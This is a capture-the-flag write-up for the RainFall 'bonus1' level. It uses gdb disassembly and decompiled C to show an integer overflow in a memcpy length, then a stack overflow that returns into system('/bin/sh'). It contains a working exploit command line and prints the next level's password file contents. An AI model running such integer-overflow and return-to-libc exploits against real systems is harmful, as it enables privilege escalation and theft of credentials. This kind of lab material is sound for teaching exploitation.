# Bonus1

```bash
(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482d4  _init
0x08048320  memcpy
0x08048320  memcpy@plt
0x08048330  __gmon_start__
0x08048330  __gmon_start__@plt
0x08048340  __libc_start_main
0x08048340  __libc_start_main@plt
0x08048350  execl
0x08048350  execl@plt
0x08048360  atoi
0x08048360  atoi@plt
0x08048370  _start
0x080483a0  __do_global_dtors_aux
0x08048400  frame_dummy
0x08048424  main
0x080484b0  __libc_csu_init
0x08048520  __libc_csu_fini
0x08048522  __i686.get_pc_thunk.bx
0x08048530  __do_global_ctors_aux
0x0804855c  _fini
```

There is an `execl` function call, we will probably need it !

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:	push   ebp
   0x08048425 <+1>:	mov    ebp,esp
   0x08048427 <+3>:	and    esp,0xfffffff0
   0x0804842a <+6>:	sub    esp,0x40
   0x0804842d <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048430 <+12>:	add    eax,0x4
   0x08048433 <+15>:	mov    eax,DWORD PTR [eax]
   0x08048435 <+17>:	mov    DWORD PTR [esp],eax
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    eax,0x1
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]
   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>:	add    eax,0x8
   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]
   0x08048462 <+62>:	mov    edx,eax
   0x08048464 <+64>:	lea    eax,[esp+0x14]
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    eax,0x0
   0x080484a3 <+127>:	leave  
   0x080484a4 <+128>:	ret    
End of assembler dump.
```

Here is the main function, this program takes 2 arguments.

Based on https://dogbolt.org/?id=e9dbc80b-2f99-46a6-8bbc-0ef4b8c2bda0#Boomerang=1&Hex-Rays=126&Ghidra=136&BinaryNinja=103, it should look like this :

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _BYTE dest[40]; // [esp+14h] [ebp-2Ch] BYREF
  int v5; // [esp+3Ch] [ebp-4h]

  v5 = atoi(argv[1]);
  if ( v5 > 9 )
    return 1;
  memcpy(dest, argv[2], 4 * v5);
  if ( v5 == 1464814662 )
    execl("/bin/sh", "sh", 0);
  return 0;
}
```

We will try to overwrite `dest` with `argv[2]` during the `memcpy` call.

It will not be possible because we  only copy at max 9 * 4 = 36 chars while we need to overflow at least after 60 chars :

- `sub    esp,0x40` = 60 chars for variable `dest`

We cannot do anything with a size of 36…

It seems that we will have to int overflow `atoi`. As in `memcpy` we do `v5 * 4` we may achieve to have a positive number that will be big enough.

To get  the overflow, our negative number should be greater than INT_MIN when multiplied by 4 !

INT_MIN = –**2147483648**

-**2147483648 / 4 = -536870912**

As said before, we need 60 chars to overwrite EIP. After it, it should be easy to call `system`, because we already have the string `"/bin/sh"` , with no calculations !

The overflow will go from -**2147483648** to **2147483647** to **2147483646** etc…

we need a big overflow to achieve this. We will try several values :

- -550 000 000 → 2094967296 (we should go bigger)
- -1 000 000 000 → 294967296 (bigger)
- -1 500 000 000 → -1705032704 (smaller ?)
- -1 200 000 000 → -505032704 (smaller)
- -1050000000 → 94967296 (bigger)
- …
- -1073741805 → 76

Ok we have 76 ! We can modify the last number to adapt it 4 by 4. To find this, I modified each number from bigger to smaller, and when I found the smallest positive value I took it.

We don’t want garbbage so we will use a nearly exact value !

Next the overflow of EIP : our local variable is 60 bytes long

```bash
(gdb) r -1073741805 `python -c 'print("A" * 60)'`
Starting program: /home/user/bonus1/bonus1 -1073741805 `python -c 'print("A" * 60)'`

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

EIP was overwritten !! Now we will place the address of `system` inside of EIP, then the return address of `memcpy` , and finally the address of `"/bin/sh"` !

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

Return address for `memcpy`  : `0x08048478`  (see `disas main`)

```bash
(gdb) x/s 0x8048583
0x8048583:	 "/bin/sh"
```

```bash
bonus1@RainFall:~$ ./bonus1 -1073741805 `python -c 'print("A" * 56 + "\x60\xb0\xe6\xb7" + "\x78\x84\x04\x08" + "\x83\x85\x04\x08")'`
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```